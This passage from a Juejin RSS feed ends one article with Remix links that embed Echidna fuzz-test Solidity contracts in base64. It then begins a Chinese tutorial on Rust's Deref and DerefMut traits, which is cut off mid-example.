<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fremix.ethereum.org%2F%3F%23code%3DLy8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8qCmRvY2tlciBydW4gLWl0IC0tcm0gLXYgJFBXRDovY29kZSB0cmFpbG9mYml0cy9ldGgtc2VjdXJpdHktdG9vbGJveAplY2hpZG5hIEVjaGlkbmFUZXN0VGltZUFuZENhbGxlci5zb2wgLS1jb250cmFjdCBFY2hpZG5hVGVzdFRpbWVBbmRDYWxsZXIKKi8KY29udHJhY3QgRWNoaWRuYVRlc3RUaW1lQW5kQ2FsbGVyIHsKICAgIGJvb2wgcHJpdmF0ZSBwYXNzID0gdHJ1ZTsKICAgIHVpbnQyNTYgcHJpdmF0ZSBjcmVhdGVkQXQgPSBibG9jay50aW1lc3RhbXA7CgogICAgLyoKICAgIHRlc3Qgd2lsbCBmYWlsIGlmIEVjaGlkbmEgY2FuIGNhbGwgc2V0RmFpbCgpCiAgICB0ZXN0IHdpbGwgcGFzcyBvdGhlcndpc2UKICAgICovCiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3RfcGFzcygpIHB1YmxpYyB2aWV3IHJldHVybnMgKGJvb2wpIHsKICAgICAgICByZXR1cm4gcGFzczsKICAgIH0KCiAgICBmdW5jdGlvbiBzZXRGYWlsKCkgZXh0ZXJuYWwgewogICAgICAgIC8qCiAgICAgICAgRWNoaWRuYSBjYW4gY2FsbCB0aGlzIGZ1bmN0aW9uIGlmIGRlbGF5IDw9IG1heCBibG9jayBkZWxheQogICAgICAgIE90aGVyd2lzZSBFY2hpZG5hIHdpbGwgbm90IGJlIGFibGUgdG8gY2FsbCB0aGlzIGZ1bmN0aW9uLgogICAgICAgIE1heCBibG9jayBkZWxheSBjYW4gYmUgZXh0ZW5kZWQgYnkgc3BlY2lmeWluZyBpdCBpbiBhIGNvbmZpZ3VyYXRpb24gZmlsZS4KICAgICAgICAqLwogICAgICAgIHVpbnQyNTYgZGVsYXkgPSA3IGRheXM7CiAgICAgICAgcmVxdWlyZShibG9jay50aW1lc3RhbXAgPj0gY3JlYXRlZEF0ICsgZGVsYXkpOwogICAgICAgIHBhc3MgPSBmYWxzZTsKICAgIH0KCiAgICAvLyBEZWZhdWx0IHNlbmRlcnMKICAgIC8vIENoYW5nZSB0aGUgYWRkcmVzc2VzIHRvIHNlZSB0aGUgdGVzdCBmYWlsCiAgICBhZGRyZXNzWzNdIHByaXZhdGUgc2VuZGVycyA9CiAgICAgICAgW2FkZHJlc3MoMHgxMDAwMCksIGFkZHJlc3MoMHgyMDAwMCksIGFkZHJlc3MoMHgzMDAwMCldOwoKICAgIGFkZHJlc3MgcHJpdmF0ZSBzZW5kZXIgPSBtc2cuc2VuZGVyOwoKICAgIC8vIFBhc3MgX3NlbmRlciBhcyBpbnB1dCBhbmQgcmVxdWlyZSBtc2cuc2VuZGVyID09IF9zZW5kZXIKICAgIC8vIHRvIHNlZSBfc2VuZGVyIGZvciBjb3VudGVyIGV4YW1wbGUKICAgIGZ1bmN0aW9uIHNldFNlbmRlcihhZGRyZXNzIF9zZW5kZXIpIGV4dGVybmFsIHsKICAgICAgICByZXF1aXJlKF9zZW5kZXIgPT0gbXNnLnNlbmRlcik7CiAgICAgICAgc2VuZGVyID0gbXNnLnNlbmRlcjsKICAgIH0KCiAgICAvLyBDaGVjayBkZWZhdWx0IHNlbmRlcnMuIFNlbmRlciBzaG91bGQgYmUgb25lIG9mIHRoZSAzIGRlZmF1bHQgYWNjb3VudHMuCiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3Rfc2VuZGVyKCkgcHVibGljIHZpZXcgcmV0dXJucyAoYm9vbCkgewogICAgICAgIGZvciAodWludDI1NiBpOyBpIDwgMzsgaSsrKSB7CiAgICAgICAgICAgIGlmIChzZW5kZXIgPT0gc2VuZGVyc1tpXSkgewogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQp9Cg%3D%3D" target="_blank" title="https://remix.ethereum.org/?#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8qCmRvY2tlciBydW4gLWl0IC0tcm0gLXYgJFBXRDovY29kZSB0cmFpbG9mYml0cy9ldGgtc2VjdXJpdHktdG9vbGJveAplY2hpZG5hIEVjaGlkbmFUZXN0VGltZUFuZENhbGxlci5zb2wgLS1jb250cmFjdCBFY2hpZG5hVGVzdFRpbWVBbmRDYWxsZXIKKi8KY29udHJhY3QgRWNoaWRuYVRlc3RUaW1lQW5kQ2FsbGVyIHsKICAgIGJvb2wgcHJpdmF0ZSBwYXNzID0gdHJ1ZTsKICAgIHVpbnQyNTYgcHJpdmF0ZSBjcmVhdGVkQXQgPSBibG9jay50aW1lc3RhbXA7CgogICAgLyoKICAgIHRlc3Qgd2lsbCBmYWlsIGlmIEVjaGlkbmEgY2FuIGNhbGwgc2V0RmFpbCgpCiAgICB0ZXN0IHdpbGwgcGFzcyBvdGhlcndpc2UKICAgICovCiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3RfcGFzcygpIHB1YmxpYyB2aWV3IHJldHVybnMgKGJvb2wpIHsKICAgICAgICByZXR1cm4gcGFzczsKICAgIH0KCiAgICBmdW5jdGlvbiBzZXRGYWlsKCkgZXh0ZXJuYWwgewogICAgICAgIC8qCiAgICAgICAgRWNoaWRuYSBjYW4gY2FsbCB0aGlzIGZ1bmN0aW9uIGlmIGRlbGF5IDw9IG1heCBibG9jayBkZWxheQogICAgICAgIE90aGVyd2lzZSBFY2hpZG5hIHdpbGwgbm90IGJlIGFibGUgdG8gY2FsbCB0aGlzIGZ1bmN0aW9uLgogICAgICAgIE1heCBibG9jayBkZWxheSBjYW4gYmUgZXh0ZW5kZWQgYnkgc3BlY2lmeWluZyBpdCBpbiBhIGNvbmZpZ3VyYXRpb24gZmlsZS4KICAgICAgICAqLwogICAgICAgIHVpbnQyNTYgZGVsYXkgPSA3IGRheXM7CiAgICAgICAgcmVxdWlyZShibG9jay50aW1lc3RhbXAgPj0gY3JlYXRlZEF0ICsgZGVsYXkpOwogICAgICAgIHBhc3MgPSBmYWxzZTsKICAgIH0KCiAgICAvLyBEZWZhdWx0IHNlbmRlcnMKICAgIC8vIENoYW5nZSB0aGUgYWRkcmVzc2VzIHRvIHNlZSB0aGUgdGVzdCBmYWlsCiAgICBhZGRyZXNzWzNdIHByaXZhdGUgc2VuZGVycyA9CiAgICAgICAgW2FkZHJlc3MoMHgxMDAwMCksIGFkZHJlc3MoMHgyMDAwMCksIGFkZHJlc3MoMHgzMDAwMCldOwoKICAgIGFkZHJlc3MgcHJpdmF0ZSBzZW5kZXIgPSBtc2cuc2VuZGVyOwoKICAgIC8vIFBhc3MgX3NlbmRlciBhcyBpbnB1dCBhbmQgcmVxdWlyZSBtc2cuc2VuZGVyID09IF9zZW5kZXIKICAgIC8vIHRvIHNlZSBfc2VuZGVyIGZvciBjb3VudGVyIGV4YW1wbGUKICAgIGZ1bmN0aW9uIHNldFNlbmRlcihhZGRyZXNzIF9zZW5kZXIpIGV4dGVybmFsIHsKICAgICAgICByZXF1aXJlKF9zZW5kZXIgPT0gbXNnLnNlbmRlcik7CiAgICAgICAgc2VuZGVyID0gbXNnLnNlbmRlcjsKICAgIH0KCiAgICAvLyBDaGVjayBkZWZhdWx0IHNlbmRlcnMuIFNlbmRlciBzaG91bGQgYmUgb25lIG9mIHRoZSAzIGRlZmF1bHQgYWNjb3VudHMuCiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3Rfc2VuZGVyKCkgcHVibGljIHZpZXcgcmV0dXJucyAoYm9vbCkgewogICAgICAgIGZvciAodWludDI1NiBpOyBpIDwgMzsgaSsrKSB7CiAgICAgICAgICAgIGlmIChzZW5kZXIgPT0gc2VuZGVyc1tpXSkgewogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQp9Cg==" ref="nofollow noopener noreferrer">EchidnaTestTimeAndCaller.sol</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fremix.ethereum.org%2F%3F%23code%3DLy8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8qCmVjaGlkbmEgVGVzdEVjaGlkbmEuc29sIC0tY29udHJhY3QgVGVzdENvdW50ZXIKKi8KY29udHJhY3QgQ291bnRlciB7CiAgICB1aW50MjU2IHB1YmxpYyBjb3VudDsKCiAgICBmdW5jdGlvbiBpbmMoKSBleHRlcm5hbCB7CiAgICAgICAgY291bnQgKz0gMTsKICAgIH0KCiAgICBmdW5jdGlvbiBkZWMoKSBleHRlcm5hbCB7CiAgICAgICAgY291bnQgLT0gMTsKICAgIH0KfQoKY29udHJhY3QgVGVzdENvdW50ZXIgaXMgQ291bnRlciB7CiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3RfdHJ1ZSgpIHB1YmxpYyB2aWV3IHJldHVybnMgKGJvb2wpIHsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3RfZmFsc2UoKSBwdWJsaWMgdmlldyByZXR1cm5zIChib29sKSB7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIGZ1bmN0aW9uIGVjaGlkbmFfdGVzdF9jb3VudCgpIHB1YmxpYyB2aWV3IHJldHVybnMgKGJvb2wpIHsKICAgICAgICAvLyBIZXJlIHdlIGFyZSB0ZXN0aW5nIHRoYXQgQ291bnRlci5jb3VudCBzaG91bGQgYWx3YXlzIGJlIDw9IDUuCiAgICAgICAgLy8gVGVzdCB3aWxsIGZhaWwuIEVjaGlkbmEgaXMgc21hcnQgZW5vdWdoIHRvIGNhbGwgQ291bnRlci5pbmMoKSBtb3JlCiAgICAgICAgLy8gdGhhbiA1IHRpbWVzLgogICAgICAgIHJldHVybiBjb3VudCA8PSA1OwogICAgfQp9CgovKgplY2hpZG5hIFRlc3RFY2hpZG5hLnNvbCAtLWNvbnRyYWN0IFRlc3RBc3NlcnQgLS10ZXN0LW1vZGUgYXNzZXJ0aW9uCiovCmNvbnRyYWN0IFRlc3RBc3NlcnQgewogICAgZnVuY3Rpb24gdGVzdF9hc3NlcnQodWludDI1NiBfaSkgZXh0ZXJuYWwgewogICAgICAgIGFzc2VydChfaSA8IDEwKTsKICAgIH0KCiAgICAvLyBNb3JlIGNvbXBsZXggZXhhbXBsZQogICAgZnVuY3Rpb24gYWJzKHVpbnQyNTYgeCwgdWludDI1NiB5KSBwcml2YXRlIHB1cmUgcmV0dXJucyAodWludDI1NikgewogICAgICAgIGlmICh4ID49IHkpIHsKICAgICAgICAgICAgcmV0dXJuIHggLSB5OwogICAgICAgIH0KICAgICAgICByZXR1cm4geSAtIHg7CiAgICB9CgogICAgZnVuY3Rpb24gdGVzdF9hYnModWludDI1NiB4LCB1aW50MjU2IHkpIGV4dGVybmFsIHsKICAgICAgICB1aW50MjU2IHogPSBhYnMoeCwgeSk7CiAgICAgICAgaWYgKHggPj0geSkgewogICAgICAgICAgICBhc3NlcnQoeiA8PSB4KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBhc3NlcnQoeiA8PSB5KTsKICAgICAgICB9CiAgICB9Cn0K" target="_blank" title="https://remix.ethereum.org/?#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8qCmVjaGlkbmEgVGVzdEVjaGlkbmEuc29sIC0tY29udHJhY3QgVGVzdENvdW50ZXIKKi8KY29udHJhY3QgQ291bnRlciB7CiAgICB1aW50MjU2IHB1YmxpYyBjb3VudDsKCiAgICBmdW5jdGlvbiBpbmMoKSBleHRlcm5hbCB7CiAgICAgICAgY291bnQgKz0gMTsKICAgIH0KCiAgICBmdW5jdGlvbiBkZWMoKSBleHRlcm5hbCB7CiAgICAgICAgY291bnQgLT0gMTsKICAgIH0KfQoKY29udHJhY3QgVGVzdENvdW50ZXIgaXMgQ291bnRlciB7CiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3RfdHJ1ZSgpIHB1YmxpYyB2aWV3IHJldHVybnMgKGJvb2wpIHsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3RfZmFsc2UoKSBwdWJsaWMgdmlldyByZXR1cm5zIChib29sKSB7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIGZ1bmN0aW9uIGVjaGlkbmFfdGVzdF9jb3VudCgpIHB1YmxpYyB2aWV3IHJldHVybnMgKGJvb2wpIHsKICAgICAgICAvLyBIZXJlIHdlIGFyZSB0ZXN0aW5nIHRoYXQgQ291bnRlci5jb3VudCBzaG91bGQgYWx3YXlzIGJlIDw9IDUuCiAgICAgICAgLy8gVGVzdCB3aWxsIGZhaWwuIEVjaGlkbmEgaXMgc21hcnQgZW5vdWdoIHRvIGNhbGwgQ291bnRlci5pbmMoKSBtb3JlCiAgICAgICAgLy8gdGhhbiA1IHRpbWVzLgogICAgICAgIHJldHVybiBjb3VudCA8PSA1OwogICAgfQp9CgovKgplY2hpZG5hIFRlc3RFY2hpZG5hLnNvbCAtLWNvbnRyYWN0IFRlc3RBc3NlcnQgLS10ZXN0LW1vZGUgYXNzZXJ0aW9uCiovCmNvbnRyYWN0IFRlc3RBc3NlcnQgewogICAgZnVuY3Rpb24gdGVzdF9hc3NlcnQodWludDI1NiBfaSkgZXh0ZXJuYWwgewogICAgICAgIGFzc2VydChfaSA8IDEwKTsKICAgIH0KCiAgICAvLyBNb3JlIGNvbXBsZXggZXhhbXBsZQogICAgZnVuY3Rpb24gYWJzKHVpbnQyNTYgeCwgdWludDI1NiB5KSBwcml2YXRlIHB1cmUgcmV0dXJucyAodWludDI1NikgewogICAgICAgIGlmICh4ID49IHkpIHsKICAgICAgICAgICAgcmV0dXJuIHggLSB5OwogICAgICAgIH0KICAgICAgICByZXR1cm4geSAtIHg7CiAgICB9CgogICAgZnVuY3Rpb24gdGVzdF9hYnModWludDI1NiB4LCB1aW50MjU2IHkpIGV4dGVybmFsIHsKICAgICAgICB1aW50MjU2IHogPSBhYnMoeCwgeSk7CiAgICAgICAgaWYgKHggPj0geSkgewogICAgICAgICAgICBhc3NlcnQoeiA8PSB4KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBhc3NlcnQoeiA8PSB5KTsKICAgICAgICB9CiAgICB9Cn0K" ref="nofollow noopener noreferrer">TestEchidna.sol</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rust实用工具特型-Deref 与 DerefMut]]></title>    <link>https://juejin.cn/post/7596943803933786152</link>    <guid>https://juejin.cn/post/7596943803933786152</guid>    <pubDate>2026-01-20T01:13:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596943803933786152" data-draft-id="7596932640726827043" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rust实用工具特型-Deref 与 DerefMut"/> <meta itemprop="keywords" content="后端,Rust"/> <meta itemprop="datePublished" content="2026-01-20T01:13:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="噗噜噗噜啪"/> <meta itemprop="url" content="https://juejin.cn/user/4037062427148462"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rust实用工具特型-Deref 与 DerefMut
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4037062427148462/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    噗噜噗噜啪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:13:42.000Z" title="Tue Jan 20 2026 01:13:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你有没有想过，为什么 <code>String</code> 能直接传给接受 <code>&amp;str</code> 的函数？为什么 <code>Box&lt;T&gt;</code> 能像普通值一样调用方法？</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">print_text</span>(s: &amp;<span class="hljs-type">str</span>) {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, s);
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">my_string</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>);
<span class="hljs-title function_ invoke__">print_text</span>(&amp;my_string);  <span class="hljs-comment">// 为什么 &amp;String 能传给 &amp;str？</span>
</code></pre>
<p>答案就是 <code>Deref</code> trait。它做了两件事：</p>
<ol>
<li><strong>让你的类型支持 <code>*</code> 解引用</strong>：<code>*boxed</code> 能拿到 Box 里的值</li>
<li><strong>自动类型转换</strong>：<code>&amp;String</code> 自动变成 <code>&amp;str</code>，<code>&amp;Vec&lt;T&gt;</code> 自动变成 <code>&amp;[T]</code></li>
</ol>
<p>第二点才是 <code>Deref</code> 的杀手锏——你写 API 时只需要接受 <code>&amp;str</code>，调用者传 <code>String</code>、<code>&amp;str</code>、<code>Box&lt;str&gt;</code> 都行，Rust 会自动帮你转换。</p>
<h2 data-id="heading-0">1. 核心概念</h2>
<h3 data-id="heading-1">Deref 到底是什么？</h3>
<p>先看一个最简单的例子：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">x</span> = <span class="hljs-number">5</span>;
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">r</span> = &amp;x;      <span class="hljs-comment">// r 是引用</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">y</span> = *r;      <span class="hljs-comment">// *r 解引用，拿到 5</span>
</code></pre>
<p>引用天生支持 <code>*</code> 解引用。但如果你自己写了个智能指针类型，怎么让它也能用 <code>*</code>？</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt;(T);

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">boxed</span> = <span class="hljs-title function_ invoke__">MyBox</span>(<span class="hljs-number">5</span>);
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">value</span> = *boxed;  <span class="hljs-comment">// 错误！MyBox 不支持 *</span>
</code></pre>
<p>这就是 <code>Deref</code> trait 的第一个作用：<strong>让自定义类型支持 <code>*</code> 运算符</strong>。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ops::Deref;

<span class="hljs-keyword">impl</span>&lt;T&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = T;  <span class="hljs-comment">// 解引用后得到什么类型</span>
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;T {
        &amp;<span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>  <span class="hljs-comment">// 返回内部值的引用</span>
    }
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">boxed</span> = <span class="hljs-title function_ invoke__">MyBox</span>(<span class="hljs-number">5</span>);
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">value</span> = *boxed;  <span class="hljs-comment">// 现在可以了！等价于 *(boxed.deref())</span>
</code></pre>
<p><strong>关键理解</strong>：<code>*boxed</code> 不是直接拿到值，而是：</p>
<ol>
<li>调用 <code>boxed.deref()</code> 得到 <code>&amp;T</code></li>
<li>再对这个引用解引用，得到 <code>T</code></li>
</ol>
<p>所以 <code>*boxed</code> 实际上是 <code>*(boxed.deref())</code> 的语法糖。</p>
<h3 data-id="heading-2">Deref 的真正威力：自动类型转换</h3>
<p>但 <code>Deref</code> 最牛的地方不是 <code>*</code> 运算符，而是<strong>解引用强制转换</strong>（deref coercion）。</p>
<p>看这个例子：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">print_length</span>(s: &amp;<span class="hljs-type">str</span>) {
